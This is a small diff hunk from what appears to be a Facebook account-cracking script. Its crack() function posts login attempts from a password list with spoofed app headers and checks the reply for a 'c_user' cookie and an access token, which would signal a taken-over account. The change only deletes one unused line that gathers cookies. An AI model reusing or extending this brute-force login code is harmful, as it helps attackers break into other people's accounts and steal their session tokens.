@@ -258,7 +258,6 @@ def crack(uid, password_list, total_count):
             'x-fb-server-cluster': 'True',
             'x-fb-conn-uuid-client': '+KICAyif8dofWZ3R9QuCKw==',}      
             response = Session.post(url,headers=headers,params=log_data)
-            log_cookies = Session.cookies.get_dict().keys()
             # Check response
             if "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
                 cookie_raw = re.sub(r'\\(?!/)', '', response.text)
